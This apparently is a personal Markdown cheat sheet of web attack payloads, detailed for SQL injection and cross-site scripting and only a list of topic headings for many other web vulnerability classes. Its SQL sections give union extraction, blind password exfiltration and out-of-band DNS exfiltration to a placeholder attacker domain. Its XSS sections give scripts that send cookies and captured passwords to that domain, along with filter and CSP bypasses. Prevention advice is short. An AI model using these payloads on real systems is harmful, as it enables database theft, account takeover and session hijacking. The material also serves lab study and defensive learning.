# Web Knowledge 
## SQL injection

A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details.

#### SQLi Basics

Here will be some basics informations to get when you have a successfull injection

- SQL injection attack, querying the database type and version on Oracle

	- Depending on the DB you can get the version as follow:
		- Microsoft, MySQL
		  ```sql
		  SELECT @@version
		  ```
		  
		- Oracle
		    ```sql
			SELECT * FROM v$version`
			```
		- PostgreSQL
			```sql
			SELECT version()
			```
			
- SQL injection attack, listing the database contents 

	- Non-Oracle DB 
		```sql
		select * from information\_schema.tables
		```
	- Oracle DB
		```sql
		select * from all_tables
		```

#### Union SQL attack 

These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are:
-   The individual queries must return the same number of columns.
-   The data types in each column must be compatible between the individual queries

You can have those following examples : 

- Determining the number of columns returned by the query
	 ```sql 	
	' union select NULL-- 
	 ``` 
	 *increasing number of NULL value until values are actually return*
	```sql
	' order by 1-- 
	```
	*increasing the int value until an error occured*
		
		
- Finding a column containing text
	```sql
	union select 'a', NULL, NULL, ...--
	```
	*Add as many null as you need to match the number of columns*
		
		
- Retrieving data from other tables
	```sql
	union select CHAMP1, CHAMP2, .... from TABLE_NAME--
	```
	 *Again add as many null value as needed* 
		
		
- Retrieving multiple values in a single column
	```sql 
	union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--
	```
	*Very usefull when you only have the capacity to extract data from a uniq column*
		
		
#### Blind SQL attack 

- Conditional responses

	The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : 
	```sql
	' and (select substring(password,1,1) from users where username='administrator')='a`
	```
- Conditional errors

	The goal here is to check errors based on a True query and on a false one. Here is an example:
	 ```sql
	 ' and (select case when (1=2) then 1/0 else 'a' end)='a
	 ``` 
	 => True statement
	
	
	```sql
	' and (select case when (1=1) then 1/0 else 'a' end)='a
	``` 
	=> False statement
	
	
- Time delays

    This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you've got SQLi. Examples : 
	
	```sql
	';sleep(10)--
	```
	
	```sql
	'; if (1=1) waitfor delay '0:0:5'--
	```
	
	
- Time delays and information retrieval

	Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : 
	```sql
	'; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--
	```
	
	
- Out-of-band (OAST)

   This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that's simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those :
   * For Microsoft SQL Server
      		
		```sql
		'; exec master..xp\_dirtree '//MYDOMAIN/a'--
		```
		*basic test*
		
		
		```sql
		declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q)
		```
		*return data on subdomain param*
		
		
   *  MYSQL
	   			=> Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
	   
	* ORACLE
		```sql
		select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'||'MYDOMAIN',80) from 	dual;
		```


- SQL injection vulnerability allowing login bypass
	* Very simple : `username'--`

#### How to prevent them 

If a SQL injection attack is successfully carried out, the damage could be expensive in terms of resources and customer trust. That is why detecting this type of attack in a timely manner is important. Web application firewalls (WAF) are the most common tool used to filter out SQLi attacks. WAFs are based on a library of updated attack signatures and can be configured to flag malicious SQL queries.

In order to prevent a SQL injection attack from occurring in the first place, developers can follow these practices:

-   Avoid SQL statements that allow user input, choose prepared statements and parameterized queries instead.
-   Perform input validation, or sanitization, for user-provided arguments.
-   Do not leave sensitive data in plaintext format, or use encryption.
-   Limit database permissions, privileges and capabilities to the bare minimum.
-   Keep databases updated on security patches.
-   Routinely test the security measures of applications that rely on databases.
-   Remove the display of database error messages to the users.


## Cross-site scripting

Cross-site scripting is used to inject malicious javascript code to user browser. This attack can lead to a total control of the application in use. More details and specific stuff can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

#### Basics


- Exploiting cross-site scripting to steal cookies

	This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. 
	
	There is comon security system used to avoid this attack:
	-   The victim might not be logged in.
	-   Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
	-   Sessions might be locked to additional factors like the user's IP address.
	-   The session might time out before you're able to hijack it.
	
	Here is an example of that type of XSS:
	```javascript 
	<script> fetch('https://MYDOMAIN', {  method: 'POST',  mode: 'no-cors',  body:document.cookie  });  </script>
	```


- Exploiting cross-site scripting to capture passwords
	
	This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : 
	
	```html
	<input name=username id=username>  
	<input type=password name=password onchange="if(this.value.length)fetch('https://MYDOMAIN',{  
	method:'POST',  
	mode: 'no-cors',  
	body:username.value+':'+this.value  
	});">
	```


- Exploiting XSS to perform CSRF

	XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: 
	
	```javascript
	<script>  
	var req = new XMLHttpRequest();  
	req.onload = handleResponse;  
	req.open('get','/my-account',true);  
	req.send();  
	function handleResponse() {  
	 var token = this.responseText.match(/name="csrf" value="(\\w+)"/)\[1\];  
	 var changeReq = new XMLHttpRequest();  
	 changeReq.open('post', '/my-account/change-email', true);  
	 changeReq.send('csrf='+token+'&email=test@test.com')  
	};  
	</script>
	```


#### Reflected XSS 

Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : 

- HTML context with nothing encoded

	 ```javascript
	 <script>alert(1)</script>
	 ```
 
 
- HTML context with most tags and attributes blocked

	```html 
	<iframe src="https://WEBSITE/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
	```


- HTML context with all tags blocked except custom ones

	```javascript
	<script>  
	location = 'https://WEBSITE/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';  
	</script>
	```


- Event handlers and href attributes blocked

	```javascript
	https://WEBSITE/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
	```

- Some SVG markup allowed

	```javascript
	https://WEBSITE/?search="><svg><animatetransform onbegin=alert(1)>
	```


- Reflected XSS with AngularJS sandbox escape without strings

	```javascript
	https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d\[\].join;\[1\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
	```
	
	
- Reflected XSS with AngularJS sandbox escape and CSP

	```html
	<script>  
	location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
	</script>
	```
	

#### Stored XSS 
Stored XSS is an injection in the actual page by any way (message, template injection, input, ...). Here are some examples: 

- Stored XSS into anchor href attribute with double quotes HTML-encoded

	 ```javascript
	 javascript:alert('XSS')
	 ```
	 
	 
- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

	```javascript
	&apos;-alert(1)-&apos;
	```
	

#### DOM XSS 

DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

As the vulnaribility is app specific, there will be no example and you will have to use your brain. 


#### Escape CSP

CSP or 'Content Security Policy ' is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a [checker](https://csp-evaluator.withgoogle.com/) to dig in what you have in front of you. As the topic is large again here is a [link](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) to understand what the checker gave you 


#### How to prevent them 

-   **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
-   **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
-   **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
-   **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.



## Cross-site request forgery (CSRF)
- CSRF vulnerability with no defenses
- CSRF where token validation depends on request method
- CSRF where token validation depends on token being present
- CSRF where token is not tied to user session
- CSRF where token is tied to non-session cookie
- CSRF where token is duplicated in cookie
- CSRF where Referer validation depends on header being present
- CSRF with broken Referer validation


## Clickjacking
- Basic clickjacking with CSRF token protection
- Clickjacking with form input data prefilled from a URL parameter
- Clickjacking with a frame buster script
- Exploiting clickjacking vulnerability to trigger DOM-based XSS
- Multistep clickjacking
## DOM-based vulnerabilities
- DOM XSS using web messages
- DOM XSS using web messages and a JavaScript URL
- DOM XSS using web messages and JSON.parse
- DOM-based open redirection
- DOM-based cookie manipulation
- Exploiting DOM clobbering to enable XSS
- Clobbering DOM attributes to bypass HTML filters
## Cross-origin resource sharing (CORS)
- CORS vulnerability with basic origin reflection
- CORS vulnerability with trusted null origin
- CORS vulnerability with trusted insecure protocols
- CORS vulnerability with internal network pivot attack
## XML external entity (XXE) injection
- Exploiting XXE using external entities to retrieve files
- Exploiting XXE to perform SSRF attacks
- Blind XXE with out-of-band interaction
- Blind XXE with out-of-band interaction via XML parameter entities
- Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Exploiting blind XXE to retrieve data via error messages
- Exploiting XXE to retrieve data by repurposing a local DTD
- Exploiting XInclude to retrieve files
- Exploiting XXE via image file upload
## Server-side request forgery (SSRF)
- Basic SSRF against the local server
- Basic SSRF against another back-end system
- SSRF with blacklist-based input filter
- SSRF with whitelist-based input filter
- SSRF with filter bypass via open redirection vulnerability
- Blind SSRF with out-of-band detection
- Blind SSRF with Shellshock exploitation
## HTTP request smuggling
- HTTP request smuggling, basic CL.TE vulnerability
- HTTP request smuggling, basic TE.CL vulnerability
- HTTP request smuggling, obfuscating the TE header
- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
- HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
- Exploiting HTTP request smuggling to reveal front-end request rewriting
- Exploiting HTTP request smuggling to capture other users' requests
- Exploiting HTTP request smuggling to deliver reflected XSS
- Exploiting HTTP request smuggling to perform web cache poisoning
- Exploiting HTTP request smuggling to perform web cache deception
## OS command injection
- OS command injection, simple case
- Blind OS command injection with time delays
- Blind OS command injection with output redirection
- Blind OS command injection with out-of-band interaction
- Blind OS command injection with out-of-band data exfiltration
## Server-side template injection
- Basic server-side template injection
- Basic server-side template injection (code context)
- Server-side template injection using documentation
- Server-side template injection in an unknown language with a documented exploit
- Server-side template injection with information disclosure via user-supplied objects
- Server-side template injection in a sandboxed environment
- Server-side template injection with a custom exploit
## Directory traversal
- File path traversal, simple case
- File path traversal, traversal sequences blocked with absolute path bypass
- File path traversal, traversal sequences stripped non-recursively
- File path traversal, traversal sequences stripped with superfluous URL-decode
- File path traversal, validation of start of path
- File path traversal, validation of file extension with null byte bypass
## Access control vulnerabilities
- Unprotected admin functionality
- Unprotected admin functionality with unpredictable URL
- User role controlled by request parameter
- User role can be modified in user profile
- URL-based access control can be circumvented
- Method-based access control can be circumvented
- User ID controlled by request parameter 
- User ID controlled by request parameter, with unpredictable user IDs
		
- User ID controlled by request parameter with data leakage in redirect 
- User ID controlled by request parameter with password disclosure
- Insecure direct object references
- Multi-step process with no access control on one step
		
- Referer-based access control
		
## Authentication
- Username enumeration via different responses
- Username enumeration via subtly different responses
- Username enumeration via response timing
- Broken brute-force protection, IP block
- Username enumeration via account lock
- Broken brute-force protection, multiple credentials per request
- 2FA simple bypass
- 2FA broken logic
- 2FA bypass using a brute-force attack
- Brute-forcing a stay-logged-in cookie
- Offline password cracking
- Password reset broken logic
- Password reset poisoning via middleware
- Password brute-force via password change
## WebSockets
- Manipulating WebSocket messages to exploit vulnerabilities
- Manipulating the WebSocket handshake to exploit vulnerabilities
- Cross-site WebSocket hijacking
## Web cache poisoning
- Web cache poisoning with an unkeyed header
- Web cache poisoning with an unkeyed cookie
- Web cache poisoning with multiple headers
- Targeted web cache poisoning using an unknown header
- Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
- Combining web cache poisoning vulnerabilities
- Web cache poisoning via an unkeyed query string
- Web cache poisoning via an unkeyed query parameter
- Parameter cloaking
- Web cache poisoning via a fat GET request
- URL normalization
- Cache key injection
- Internal cache poisoning
## Insecure deserialization
- Modifying serialized objects
- Modifying serialized data types
- Using application functionality to exploit insecure deserialization
- Arbitrary object injection in PHP
- Exploiting Java deserialization with Apache Commons
- Exploiting PHP deserialization with a pre-built gadget chain
- Exploiting Ruby deserialization using a documented gadget chain
- Developing a custom gadget chain for Java deserialization
- Developing a custom gadget chain for PHP deserialization
- Using PHAR deserialization to deploy a custom gadget chain
## Information disclosure
- Information disclosure in error messages
- Information disclosure on debug page
- Source code disclosure via backup files
- Authentication bypass via information disclosure
- Information disclosure in version control history
## Business logic vulnerabilities
- Excessive trust in client-side controls
- High-level logic vulnerability
- Low-level logic flaw
- Inconsistent handling of exceptional input
- Inconsistent security controls
- Weak isolation on dual-use endpoint
- Insufficient workflow validation
- Authentication bypass via flawed state machine
- Flawed enforcement of business rules
- Infinite money logic flaw
- Authentication bypass via encryption oracle
## HTTP Host header attacks
- Basic password reset poisoning
- Password reset poisoning via dangling markup
- Web cache poisoning via ambiguous requests
- Host header authentication bypass
- Routing-based SSRF
- SSRF via flawed request parsing
## OAuth authentication
- Authentication bypass via OAuth implicit flow
- Forced OAuth profile linking
- OAuth account hijacking via redirect_uri
- Stealing OAuth access tokens via an open redirect
- Stealing OAuth access tokens via a proxy page
- SSRF via OpenID dynamic client registration
